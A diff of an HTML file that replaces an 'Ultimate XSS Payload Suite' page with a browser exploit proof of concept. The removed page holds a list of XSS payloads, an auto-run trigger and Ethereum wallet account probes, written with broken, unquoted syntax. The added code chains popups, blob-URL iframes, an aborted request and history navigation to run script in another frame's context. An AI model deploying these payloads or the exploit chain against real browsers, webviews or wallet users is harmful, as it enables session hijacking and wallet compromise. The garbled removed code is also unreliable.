@@ -1,137 +1,69 @@
-<!DOCTYPE html>
 <html>
-<head>
-    <title>🔥 Ultimate Universal XSS Payload v2.0</title>
-    <meta charset="UTF-8">
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box;}
-        body{font-family:monospace;background:#1a1a1a;color:#00ff00;padding:20px;overflow:auto;}
-        .btn{padding:15px 30px;font-size:18px;background:linear-gradient(45deg,#ff006e,#8338ec);color:white;border:none;border-radius:8px;cursor:pointer;transition:all 0.3s;}
-        .btn:hover{transform:scale(1.05);box-shadow:0 0 20px #ff006e;}
-        #output{background:#000;padding:15px;border-radius:8px;font-size:14px;line-height:1.4;max-height:60vh;overflow:auto;}
-        .status{padding:10px;margin:10px 0;border-radius:5px;}
-        .success{background:#004d00;}
-        .error{background:#4d0000;}
-        .info{background:#001a4d;}
-    </style>
-</head>
-<body>
-    <h1>🚀 Ultimate XSS Payload Suite</h1>
-    <p><strong>Universal coverage untuk WebView/DApps/Wallet browsers</strong></p>
-    
-    <button class="btn" onclick="executeAll()">💥 CLICK HERE - FULL ATTACK</button>
-    <br><br>
-    
-    <div id="output" class="status info">Status: Ready for execution...</div>
 
-    <script>
-        // Comprehensive XSS payload database
-        const XSS_PAYLOADS = {
-            basic: [
-                alert('1️⃣ Basic Script'),
-                eval('alert("2️⃣ Eval")'),
-                Function('alert("3️⃣ Function ctor")')()
-            ],
-            events: [
-                <img src=x onerror=alert('4️⃣ onerror')>,
-                <svg onload=alert('5️⃣ SVG onload')>,
-                <details open ontoggle=alert('6️⃣ ontoggle')>
-            ],
-            protocols: [
-                javascript:alert('7️⃣ javascript:'),
-                vbscript:msgbox('8️⃣ vbscript'),
-                data:text/html,<script>alert('9️⃣ data:')</script>
-            ],
-            templates: [
-                \${alert('🔟 Template literal')},
-                \alert\`('11️⃣ Backtick')`,
-                "alert("12️⃣ String breakout")
-            ],
-            webview: [
-                <iframe src="javascript:alert('13️⃣ iframe js')"></iframe>,
-                <object data="javascript:alert('14️⃣ object data')">,
-                <embed src="javascript:alert('15️⃣ embed src')>
-            ],
-            wallet: [
-                window.ethereum&&ethereum.request({method:'eth_accounts'}),
-                web3&&web3.eth.getAccounts(),
-                window.postMessage({xss:true,payload:'wallet'},'*')
-            ],
-            advanced: [
-                top['\u0061\u006c\u0065\u0072\u0074'](16), // Unicode alert
-                constructor.constructor('alert(17)')(), // Prototype pollution
-                atob('YWxlcnQoMTgp') // Base64 alert
-            ]
+<body>
+  Click anywhere...
+  <script>
+    function createURL(data, type = 'text/html') {
+      return URL.createObjectURL(new Blob([data], {
+        type: type
+      }));
+    }
+
+    function navigate(w, url) {
+      let a = w.document.createElement('a');
+      a.href = url;
+      a.click();
+    }
+
+    window.onclick = () => {
+      window.w = open('about:blank', 'w', 'width=500, height=500');
+
+      let i0 = w.document.body.appendChild(document.createElement('iframe'));
+      let i1 = w.document.body.appendChild(document.createElement('iframe'));
+      i0.contentWindow.onbeforeunload = () => {
+        i0.contentWindow.onbeforeunload = null;
+
+        navigate(w, 'about:blank');
+      };
+
+      navigate(i0.contentWindow, createURL(`
+<body>
+<script>
+</scrip` + 't></body>'));
+
+      setTimeout(() => {
+        let g = i0.contentDocument.body.appendChild(document.createElement('iframe'));
+        let x = new g.contentWindow.XMLHttpRequest();
+        x.onabort = () => {
+          parseFloat('axfasdfasfdsfasfsfasdf');
+          i0.contentDocument.write();
+
+          navigate(w, 'https://abc.xyz/');
+
+          showModalDialog(createURL(`
+<script>
+let it = setInterval(() => {
+	try {
+	    opener.w.document.x;
+	} catch (e) {
+	    clearInterval(it);
+	    window.close();
+	}
+}, 10);
+</scrip` + 't>'));
+
+          setTimeout(() => {
+            i1.srcdoc = '<script>alert(parent.location);</scrip' + 't>';
+            navigate(i1.contentWindow, 'about:srcdoc');
+          }, 10);
         };
 
-        function log(type, msg) {
-            const output = document.getElementById('output');
-            const ts = new Date().toLocaleTimeString();
-            output.innerHTML += [${ts}] [${type}] ${msg}\n;
-            output.scrollTop = output.scrollHeight;
-            output.className = status ${type === 'SUCCESS' ? 'success' : type === 'ERROR' ? 'error' : 'info'};
-        }
-
-        function testPayload(payload, name) {
-            try {
-                const div = document.createElement('div');
-                div.style.display = 'none';
-                div.innerHTML = payload;
-                document.body.appendChild(div);
-                
-                // Check if payload executed (various detection methods)
-                if (window.xss_marker) {
-                    log('SUCCESS', ${name}: EXECUTED);
-                    delete window.xss_marker;
-                } else {
-                    log('INFO', ${name}: Rendered (check manually));
-                }
-            } catch(e) {
-                log('ERROR', ${name}: ${e.message});
-            }
-        }
-
-        function executeAll() {
-            log('INFO', '🚀 Starting comprehensive XSS test suite...');
-            
-            // Flatten all payloads
-            const allPayloads = Object.entries(XSS_PAYLOADS).flatMap(([cat, pays]) => 
-                pays.map(p => ({payload: p, name: `${cat.toUpperCase()}: ${p.substring(0,30)}...`}))
-            );
-
-            allPayloads.forEach(({payload, name}, i) => {
-                setTimeout(() => {
-                    // Inject marker for execution detection
-                    window.xss_marker = true;
-                    testPayload(payload, name);
-                }, i * 300);
-            });
-
-            // WebView/Wallet specific tests
-            setTimeout(() => {
-                log('INFO', '🔍 WebView/DApps detection:');
-                log('INFO', UserAgent: ${navigator.userAgent.substring(0,80)}...);
-                log('INFO', Ethereum: ${!!window.ethereum});
-                log('INFO', Web3: ${!!window.web3});
-                
-                // Try wallet interaction
-                if (window.ethereum) {
-                    ethereum.request({method: 'eth_accounts'}).then(accounts => {
-                        log('SUCCESS', Wallet accounts found: ${accounts.length});
-                    }).catch(() => log('INFO', 'Wallet access denied (expected)'));
-                }
-            }, 5000);
-        }
-
-        // Auto-execute jika dipanggil via reflected XSS
-        if (location.search.includes('xss=1') || location.hash.includes('auto')) {
-            setTimeout(executeAll, 500);
-        }
-
-        // Persistence hook
-        window.addEventListener('message', e => {
-            if (e.data.xss) log('SUCCESS', '💰 Wallet hook intercepted!');
-        });
-    </script>
+        x.open('GET', createURL('x'.repeat(0x1000000)));
+        x.send();
+        w.history.go(-2);
+      }, 200);
+    };
+  </script>
 </body>
+
 </html>
